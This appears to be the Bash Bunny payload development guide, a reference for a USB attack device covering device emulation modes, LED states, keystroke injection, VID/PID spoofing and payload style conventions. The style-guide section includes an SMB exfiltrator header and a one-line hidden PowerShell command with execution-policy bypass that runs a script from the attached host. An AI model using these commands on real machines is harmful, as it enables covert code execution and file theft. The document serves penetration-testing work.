
# Bash Bunny Payload Development

Bash Bunny payloads can be written in any standard text editor, such as notepad, vi or nano. 

Payloads must be named payload.txt. When the Bash Bunny boots with its switch in position 1 or 2, the payload.txt file from the corresponding switch folder is executed. 

Payloads can be swapped by copy/paste when the Bash Bunny is in its arming mode (switch position 3 - closest to the USB plug) via Mass Storage.

## Bunny Script

Bunny Script is a language consisting of a number of simple commands specific to the Bash Bunny hardware, some bunny helper functions and the full power of the Bash Unix shell and command language. Theses payloads, named payload.txt, execute on boot by the Bash Bunny.

The _Bunny Helpers_ can be sourced which extend the bunny scripting language with user contributed functions and variables which enhance and simplify payloads. All Bunny Script commands are written in ALL CAPS. The base Bunny Script commands are:

| COMMAND    | Description                                                           |
| ---------- | --------------------------------------------------------------------- |
| ATTACKMODE | Specifies the USB device or combination of devices to emulate.        |
| LED        | Control the RGB LED. Accepts color and pattern or payload state.      |
| QUACK      | Injects keystrokes (ducky script) or specified ducky script file.     |
| Q          | Alias for QUACK                                                       |
| DUCKY_LANG | Set the HID Kayboard language. *e.g: DUCKY_LANG us*                   |

## Extensions

Extensions which augment the bunny scripting language with new commands and functions. For each payload.txt run, extensions are sourced automatically. Calling the function names of any extension will produce the desired result. Extensions reside in the payload library on the USB mass storage partition from /payloads/library/extensions.

#### Example Extensions

This table is provides a non-exhaustive list of basic usage for some extensions. Additional extension documentation can be found from the comments within each individual extension script file in /payload/library/extensions.

| COMMAND          | Description                                                  | Example                                        |
| ---------------- | ------------------------------------------------------------ | ---------------------------------------------- |
| RUN              | Keystroke injection shortcut for mutli-OS command execution. | RUN WIN notepad.exe                            |
|                  |                                                              | RUN OSX terminal                               |
|                  |                                                              | RUN UNITY xterm                                |
| GET              | Exports system variables                                     | GET TARGET_IP # exports $TARGET_IP             |
|                  |                                                              | GET TARGET_HOSTNAME # exports $TARGET_HOSTNAME |
|                  |                                                              | GET HOST_IP # exports $HOST_IP                 |
|                  |                                                              | GET SWITCH_POSITION # exports $SWITCH_POSITION |
| REQUIRETOOL      | Exits payload with LED FAIL state if the specified tool is not found in /tools | REQUIRETOOL impacket         |
| DUCKY_LANG       | Accepts two letter country code to set the HID injection language for subsequent ducky script / QUACK commands | DUCKY_LANG us |

**NOTE**: Extensions replaced bunny_helpers.sh from [Bash Bunny firmware version 1.1](https://www.bashbunny.com/downloads/) onwards.




## ATTACKMODE

ATTACKMODE is a bunny script command which specifies which devices to emulate. The ATTACKMODE command may be issued multiple times within a given payload. For example, a payload may begin by emulating Ethernet, then switch to emulating a keyboard and serial later based on a number of conditions. 

| ATTACKMODE         | Type                                   | Description                                                |
| ------------------ | -------------------------------------- | ---------------------------------------------------------- |
| SERIAL             | ACM - Abstract Control Model           | Serial Console                                             |
| ECM_ETHERNET       | ECM - Ethernet Control Model           | Linux/Mac/Android Ethernet Adapter                         |
| RNDIS_ETHERNET     | RNDIS - Remote Network Drv Int Spec    | Windows (and some Linux) Ethernet Adapter                  |
| STORAGE            | UMS - USB Mass Storage                 | Flash Drive                                                |
| HID                | HID - Human Interface Device           | Keyboard - Keystroke Injection via Ducky Script            |

Many combinations of attack modes are possible, however some are not. For exmaple, ATTACKMODE HID STORAGE ECM_ETHERNET is valid while ATTACKMODE RNDIS_ETHERNET ECM_ETHERNET STORAGE SERIAL is not. Each attack mode combination registers using a different USB VID/PID (Vendor ID/Product ID) by default. VID and PID can be spoofed using the VID and PID commands.

| ATTACKMODE COMBINATION        | VID / PID     |
| ----------------------------- | ------------- |
| SERIAL STORAGE                | 0xF000/0xFFF0 |
| HID                           | 0xF000/0xFF01 |
| STORAGE                       | 0xF000/0xFF10 |
| SERIAL                        | 0xF000/0xFF11 |
| RNDIS_ETHERNET                | 0xF000/0xFF12 |
| ECM_ETHERNET                  | 0xF000/0xFF13 |
| HID SERIAL                    | 0xF000/0xFF14 |
| HID STORAGE                   | 0xF000/0xFF02 |
| HID RNDIS_ETHERNET            | 0xF000/0xFF03 |
| HID ECM_ETHERNET              | 0xF000/0xFF04 |
| HID STORAGE RNDIS_ETHERNET    | 0xF000/0xFF05 |
| HID STORAGE ECM_ETHERNET      | 0xF000/0xFF06 |
| SERIAL RNDIS_ETHERNET         | 0xF000/0xFF07 |
| SERIAL ECM_ETHERNET           | 0xF000/0xFF08 |
| STORAGE RNDIS_ETHERNET        | 0xF000/0xFF20 |
| STORAGE ECM_ETHERNET          | 0xF000/0xFF21 |

## LED

The multi-color RGB LED status indicator on the Bash Bunny may be set using the LED command. It accepts either a combination of color and pattern, or a common payload state. 

### LED Colors

| COMMAND | Description                    | 
| ------- | ------------------------------ |
| R       | Red                            |
| G       | Green                          |
| B       | Blue                           |
| Y       | Yellow (AKA as Amber)          |
| C       | Cyan (AKA Light Blue)          |
| M       | Magenta (AKA Violet or Purple) |
| W       | White                          |

### LED Patterns

| PATTERN    | Description                                              |
| ---------- | -------------------------------------------------------- |
| SOLID      | *Default* No blink. Used if pattern argument is ommitted |
| SLOW       | Symmetric 1000ms ON, 1000ms OFF, repeating               |
| FAST       | Symmetric 100ms ON, 100ms OFF, repeating                 |
| VERYFAST   | Symmetric 10ms ON, 10ms OFF, repeating                   |
| SINGLE     | 1 100ms blink(s) ON followed by 1 second OFF, repeating  |
| DOUBLE     | 2 100ms blink(s) ON followed by 1 second OFF, repeating  |
| TRIPLE     | 3 100ms blink(s) ON followed by 1 second OFF, repeating  |
| QUAD       | 4 100ms blink(s) ON followed by 1 second OFF, repeating  |
| QUIN       | 5 100ms blink(s) ON followed by 1 second OFF, repeating  |
| ISINGLE    | 1 100ms blink(s) OFF followed by 1 second ON, repeating  |
| IDOUBLE    | 2 100ms blink(s) OFF followed by 1 second ON, repeating  |
| ITRIPLE    | 3 100ms blink(s) OFF followed by 1 second ON, repeating  |
| IQUAD      | 4 100ms blink(s) OFF followed by 1 second ON, repeating  |
| IQUIN      | 5 100ms blink(s) OFF followed by 1 second ON, repeating  |
| SUCCESS    | 1000ms VERYFAST blink followed by SOLID                  |
| 1-10000    | Custom value in ms for continuous symmetric blinking     |

### LED State

These standardized LED States may be used to indicate common payload status. The basic LED states include **SETUP**, **FAIL**, **ATTACK**, **CLEANUP** and **FINISH**. Payload developers are encouraged to use these common payload states. Additional states including multi-staged attack patterns are shown in the table below.

| STATE    | COLOR PATTERN | Description                                   |
| -------- | ------------- | --------------------------------------------- |
| SETUP    | M SOLID       | Magenta solid                                 |
| FAIL     | R SLOW        | Red slow blink                                |
| FAIL1    | R SLOW        | Red slow blink                                |
| FAIL2    | R FAST        | Red fast blink                                |
|	FAIL3    | R VERYFAST    | Red very fast blink                           |
| ATTACK   | Y SINGLE      | Yellow single blink                           |
| STAGE1   | Y SINGLE      | Yellow single blink                           |
| STAGE2   | Y DOUBLE      | Yellow double blink                           |
| STAGE3   | Y TRIPLE      | Yellow triple blink                           |
| STAGE4   | Y QUAD        | Yellow quadruple blink                        |
| STAGE5   | Y QUIN        | Yellow quintuple blink                        |
| SPECIAL  | C ISINGLE     | Cyan inverted single blink                    |
| SPECIAL1 | C ISINGLE     | Cyan inverted single blink                    |
| SPECIAL2 | C IDOUBLE     | Cyan inverted double blink                    |
| SPECIAL3 | C ITRIPLE     | Cyan inverted triple blink                    |
| SPECIAL4 | C IQUAD       | Cyan inverted quadriple blink                 |
| SPECIAL5 | C IQUIN       | Cyan inverted quintuple blink                 |
| CLEANUP  | W FAST        | White fast blink                              |
| FINISH   | G SUCCESS     | Green 1000ms VERYFAST blink followed by SOLID |

### Examples

```
LED Y SINGLE
```
```
LED M 500
```
```
LED SETUP
```


## QUACK

The Bash Bunny is compatible with Ducky Script text files from its sister Hak5 project, the USB Rubber Ducky. These text files do not need to be encoded into inject.bin files first. Keystrokes can be injected from ducky script text files or inline using the QUACK command. The ATTACKMODE must contain HID for keystroke injection.

See the [Ducky Script - USB Rubber Ducky Wiki](http://usbrubberducky.com/#!duckyscript.md "Ducky Script - USB Rubber Ducky Wiki") for the complete scripting language.

**Examples**:

```
QUACK switch1/helloworld.txt
```
Injects keystrokes from the specified ducky script text file.

```
QUACK STRING Hello World
```
Injects the keystrokes "Hello World"

```
Q ALT F4
```
Injects the keystroke combination of ALT and F4

## VID and PID

USB devices identify themselves by combinations of vendor ID and product ID. These 16-bit IDs are specified in hex and are used by the victim PC to find drivers (if necessary) for the specified device. With the Bash Bunny, the VID and PID may be spoofed using the VID and PID parameters for ATTACKMODE.

**Example**:
~~~~
ATTACKMODE HID STORAGE VID_0XF000 PID_0X1234
~~~~

## Payload Best Practices / Style Guide

* Payloads should begin with comments specifing the name of the payload, a description, the author(s), any special requirements/dependencies, target, category, attackmodes and the LED status.

~~~~
# Title:         Faster SMB Exfiltrator
# Description:   Exfiltrates files from users documents folder to Bash Bunny via SMB
# Author:        Hak5Darren
# Props:         ImNatho, mike111b, madbuda
# Version:       1.1
# Category:      Exfiltration
# Target:        Windows XP SP3+ (Powershell)
# Attackmodes:   HID, Ethernet
~~~~

* Configurable options should be specified in variables at the top of the payload.txt file
~~~~
# Options
RESPONDER_OPTIONS="-w -r -d -P"
LOOTDIR=/root/udisk/loot/quickcreds
~~~~

* LED should use common payload states rather than unique color/pattern combinations when possible.
* The LED command should preceed the ATTACKMODE command for various stages
* Stages should be documented with comments
~~~
######## HID STAGE ########
# Runs hidden powershell which executes \\172.16.64.1\s\s.ps1 when available
GET HOST_IP
LED STAGE1
ATTACKMODE HID
RUN WIN "powershell -WindowStyle Hidden -Exec Bypass \"while (\$true) { If (Test-Connection $HOST_IP -count 1) { \\\\$HOST_IP\\s\\s.ps1; exit } }\""
~~~

* Common payload states include a **SETUP**, with may include a **FAIL** if certain conditions are not met. 
* This is typically followed by either a single **ATTACK** or multiple **STAGE**s.
* More complex payloads may include a **SPECIAL** function to wait until certain conditions are met.
* Payloads commonly end with a **CLEANUP** phase, such as moving and deleting files or stopping services.
* When the payload has **FINISH**ed, the Bash Bunny is safe to eject.
* These common payload states correspond to LED states.


## Working with the file system

The Bash Bunny contains a USB Mass Storage parition (also known as udisk) which is typically accessed via Arming Mode. This is the Bash Bunny flash drive to which payloads are copied.

When the Bash Bunny framework executes a payload, it will synchronize the USB Mass Storage partition file system once the payload completes. This can be either by an exit statement in the payload.txt, or when the Bunny Script reaches the end of file.

Keep this in mind as a payload which writes files to the USB Mass Storage partition within a loop will not have the opportunity to synchronize until the payload completes. This is why ending payloads with an LED FINISH command is advised. In this case, the payload developer is advised to use the sync command to ensure file synchronization is completed.

## Submitting Payloads

Payloads may be submitted to the [Bash Bunny Payload git repository](https://github.com/hak5/bashbunny-payloads "Bash Bunny Payload git repository"). For a video tutorial on submitting payloads, see [Hak5 episode 2126](https://www.hak5.org/episodes/season-21/hak5-2126-how-to-write-bash-bunny-payloads-contribute-on-github).

